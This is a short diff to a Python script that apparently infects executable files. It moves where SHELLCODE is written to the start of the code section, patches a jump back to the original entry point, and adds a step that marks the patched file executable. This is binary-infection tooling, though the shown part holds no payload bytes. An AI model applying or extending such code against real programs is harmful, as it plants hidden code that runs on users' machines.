@@ -229,7 +229,7 @@ def injection():
 	
     print("[+] Jump on OEP added")
 	
-    fd.seek(int(pt_load_1_end, 16))
+    fd.seek(int(start_code, 16))
     fd.write(SHELLCODE)
     fd.close()
 
@@ -240,5 +240,6 @@ loader()
 infect_entry_point()
 injection()
 
+os.system("chmod +x {}_patched".format(file))
 print("")
 print("[~] Injected correctly [~]")
